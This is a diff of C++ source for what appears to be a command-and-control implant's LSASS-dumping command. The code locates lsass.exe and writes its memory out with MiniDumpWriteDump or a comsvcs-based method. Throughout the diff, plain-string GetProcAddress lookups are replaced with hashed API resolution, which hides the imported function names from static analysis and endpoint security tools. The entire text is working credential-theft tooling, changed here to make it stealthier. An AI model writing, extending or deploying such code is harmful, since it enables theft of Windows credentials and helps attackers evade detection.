@@ -78,17 +78,17 @@ static auto declfn enable_priv(
 // find lsass.exe PID using CreateToolhelp32Snapshot
 static auto declfn find_lsass_pid( instance& inst ) -> DWORD {
     auto pCreateToolhelp32Snapshot = reinterpret_cast<fn_CreateToolhelp32Snapshot>(
-        inst.kernel32.GetProcAddress(
-            (HMODULE)inst.kernel32.handle,
-            symbol<LPCSTR>( "CreateToolhelp32Snapshot" ) ) );
+        resolve::_api(
+            reinterpret_cast<uintptr_t>( (HMODULE)inst.kernel32.handle ),
+            expr::hash_string( "CreateToolhelp32Snapshot" ) ) );
     auto pProcess32First = reinterpret_cast<fn_Process32First>(
-        inst.kernel32.GetProcAddress(
-            (HMODULE)inst.kernel32.handle,
-            symbol<LPCSTR>( "Process32First" ) ) );
+        resolve::_api(
+            reinterpret_cast<uintptr_t>( (HMODULE)inst.kernel32.handle ),
+            expr::hash_string( "Process32First" ) ) );
     auto pProcess32Next = reinterpret_cast<fn_Process32Next>(
-        inst.kernel32.GetProcAddress(
-            (HMODULE)inst.kernel32.handle,
-            symbol<LPCSTR>( "Process32Next" ) ) );
+        resolve::_api(
+            reinterpret_cast<uintptr_t>( (HMODULE)inst.kernel32.handle ),
+            expr::hash_string( "Process32Next" ) ) );
 
     if ( !pCreateToolhelp32Snapshot || !pProcess32First || !pProcess32Next )
         return 0;
@@ -145,8 +145,8 @@ static auto declfn do_minidump(
     }
 
     auto pMiniDumpWriteDump = reinterpret_cast<fn_MiniDumpWriteDump>(
-        inst.kernel32.GetProcAddress( h_dbghelp,
-            symbol<LPCSTR>( "MiniDumpWriteDump" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_dbghelp ),
+            expr::hash_string( "MiniDumpWriteDump" ) ) );
     if ( !pMiniDumpWriteDump ) {
         inst.kernel32.CloseHandle( h_lsass );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
@@ -241,9 +241,9 @@ static auto declfn do_comsvcs(
     DWORD exit_code = 1;
     typedef BOOL (WINAPI *fn_GetExitCodeProcess)( HANDLE, LPDWORD );
     auto pGetExitCodeProcess = reinterpret_cast<fn_GetExitCodeProcess>(
-        inst.kernel32.GetProcAddress(
-            (HMODULE)inst.kernel32.handle,
-            symbol<LPCSTR>( "GetExitCodeProcess" ) ) );
+        resolve::_api(
+            reinterpret_cast<uintptr_t>( (HMODULE)inst.kernel32.handle ),
+            expr::hash_string( "GetExitCodeProcess" ) ) );
     if ( pGetExitCodeProcess )
         pGetExitCodeProcess( pi.hProcess, &exit_code );
 
@@ -292,9 +292,9 @@ auto declfn starburst::cmd_lsass_dump(
     } else {
         // resolve GetTempPathA for default path
         auto pGetTempPathA = reinterpret_cast<fn_GetTempPathA>(
-            inst.kernel32.GetProcAddress(
-                (HMODULE)inst.kernel32.handle,
-                symbol<LPCSTR>( "GetTempPathA" ) ) );
+            resolve::_api(
+                reinterpret_cast<uintptr_t>( (HMODULE)inst.kernel32.handle ),
+                expr::hash_string( "GetTempPathA" ) ) );
         if ( pGetTempPathA ) {
             DWORD tlen = pGetTempPathA( 260, dump_path );
             if ( tlen == 0 || tlen > 240 ) {
